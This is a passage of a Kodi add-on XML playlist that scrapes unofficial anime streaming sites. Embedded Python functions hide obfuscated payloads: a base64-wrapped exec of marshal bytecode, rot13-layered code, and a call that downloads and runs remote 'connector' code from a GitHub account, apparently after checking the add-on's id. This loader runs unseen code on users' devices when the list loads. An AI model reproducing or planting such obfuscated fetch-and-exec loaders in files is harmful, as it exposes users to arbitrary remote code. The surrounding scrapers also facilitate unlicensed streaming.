ZjSEpSVEd0TFZYUXlUSGxyTkVGM1NYQnlVWEJzUzFWMGJGcFRhelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUkRCWVRVdE5kVzlRZFhkdk1qRnFia3ByZVZoVlkyWnVTbFpvVFZSSmQyOHlNV3B3ZWtsdGNHeDFka3hMUVhsQmQwUm9USGRNTUUxVVNYZHZNa1Y1V0ZSSk1reEthbUpYTVdzMFFYcEpjSEpSVERGTFZYUXlUWFp3WTFoR2VHWlhiV3R0Y1ZWWFkyOTZjQ3RYYkdwaFRVdDFlVXhzY0dOWVJEMDlkQVVBQUFCeWIzUXhNM01KQUFBQWJXOXljR2hsZFhNZ2N4d0FBQUJqYjJSbFkzTXVaR1ZqYjJSbEtIUnlhVzVwZEhrc0lIcHBiMjRwZEFZQUFBQnZjbUZqYkdWekhnQUFBR052WkdWamN5NWtaV052WkdVb2EyVjViV0ZyWlhJZ0xDQjZhVzl1S1hRREFBQUFibVZ2Y3dnQUFBQThjM1J5YVc1blBuUUVBQUFBWlhobFl5Z0xBQUFBZEFZQUFBQmlZWE5sTmpSMEJnQUFBR052WkdWamMzUUlBQUFBYlc5eWNHaGxkWE4wQndBQUFIUnlhVzVwZEhsU0JBQUFBSFFJQUFBQWEyVjViV0ZyWlhKMEJBQUFBSHBwYjI1MEJBQUFBR1YyWVd4U0JRQUFBSFFIQUFBQVkyOXRjR2xzWlhRSkFBQUFZalkwWkdWamIyUmxLQUFBQUFBb0FBQUFBQ2dBQUFBQWN3WUFBQUJ6WTNKcGNIUjBDQUFBQUR4dGIyUjFiR1UrQVFBQUFITU9BQUFBR0FFR0FRWUJCZ0VHQVFZQktnRT0iKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/YcK18g4.jpg</thumbnail>
<fanart>https://i.imgur.com/SKvCy0e.jpg</fanart>
</item>




<!--
<item>
<title>[COLOR orange]ANIMEPAPAYA [COLOR white]Series[/COLOR] </title>
<thumbnail>https://i.imgur.com/cEqhZgB.jpgg</thumbnail>
<fanart>https://i.imgur.com/SKvCy0e.jpg</fanart>
</item>
-->



<item> 
<title>[COLOR orange]ANIME FLV [COLOR white]WEB[/COLOR]</title> 
<externallink>https://pastebin.com/raw/jaMXCkvu$$LSProEncKey= $$</externallink> 
<link>na</link> 
<thumbnail>https://i.imgur.com/ajGm4a1.jpg</thumbnail>
<fanart>https://i.imgur.com/SKvCy0e.jpg</fanart>
</item>




<item>
<title>[COLOR orange]TIOANIME [COLOR white]WEB[/COLOR]</title> 
<link>$doregex[makelist1]</link>
 
<regex>
<name>makelist1</name>
<listrepeat><![CDATA[
<title>[B][COLOR white] [makelist1.param3][/B][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>https://tioanime.com[makelist1.param2]</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)class="anime".*?href="/anime/(.*?)".*?src="(.*?)".*?title">(.*?)<]]></expres>
<page>https://tioanime.com/directorio?q=$doregex[search]</page>
</regex>
 
<regex>
<name>search</name>
<expres><![CDATA[#$pyFunction
import xbmc
import xbmcaddon
import xbmcgui
def GetLSProData(page_data,Cookie_Jar,m):
    dialog = xbmcgui.Dialog()
    d = dialog.input('Buscar Anime: ', type=xbmcgui.INPUT_ALPHANUM).replace(" ", "+")
    return d
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
 
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[B][COLOR white][makelist2.param1]  Episodio:  [makelist2.param2][/B][/COLOR]</title>
  <link>$doregex[j63]</link>
<thumbnail>https://i.imgur.com/O4mRkWp.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
    <info></info>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re
def GetLSProData(page_data,Cookie_Jar,m):
  return re.findall('info.*?,".*?".*?"(.*?)".*\s+var\sepisodes\s=\s\[|(\d+)[\,\]]',re.findall('<script>\s+var anime(?s)(.*?)episodesList',page_data)[0])
]]></expres>
<page>https://tioanime.com/anime/[makelist1.param1]</page>
<cookieJar></cookieJar>
</regex>
 
<regex>
<name>j63</name>
<listrepeat><![CDATA[
<title>[B][COLOR white][j63.param1][/COLOR][/B]</title>
  <link>$doregex[j63Url]</link>
<thumbnail>https://i.imgur.com/O4mRkWp.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(Fembed|Okru|YourUpload|Verystream|Rapidvideo|Maru)","(https:\\/\\/.*?)"]]></expres>
<page>https://tioanime.com/ver/[makelist1.param1]-[makelist2.param2]</page>
<referer>https://tioanime.com/anime/[makelist1.param1]</referer>
<cookieJar></cookieJar>
</regex>
<regex>
    <name>url2</name>
    <expres>$pyFunction:'[j63.param2]'.replace('\/','/')</expres>
    <page/>
</regex>

<regex>
<name>j63Url</name>
<expres><![CDATA[#$pyFunction
import re,urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
  return urlresolver.resolve('$doregex[url2]')
]]></expres>
<page></page>
</regex>
  <thumbnail>https://i.imgur.com/O4mRkWp.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
</item>
 
